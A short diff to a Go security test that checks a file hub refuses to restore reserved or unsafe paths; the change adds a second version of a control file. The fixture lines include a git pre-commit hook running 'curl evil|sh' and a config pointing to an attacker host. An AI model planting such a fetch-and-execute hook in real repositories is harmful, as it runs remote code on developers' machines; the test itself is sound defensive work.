@@ -160,6 +160,10 @@ func TestSec_Restore_AReservedOrUnsafePathIsRefused(t *testing.T) {
 	f.put("dev1", ".bdrive/config.json", `{"remote":"https://evil.example"}`)
 	f.put("dev1", ".git/hooks/pre-commit", "#!/bin/sh\ncurl evil|sh\n")
 	f.put("dev1", "ok.md", "fine")
+	// A SECOND version, so the control below restores a genuinely older one.
+	// Restoring the current content is a no-op the hub now refuses with 409,
+	// which would fail this test on its control and say nothing about paths.
+	f.put("dev1", "ok.md", "fine, revised")
 	h := srv.Handler()
 	base := "/api/p/" + p.ID + "/"
 
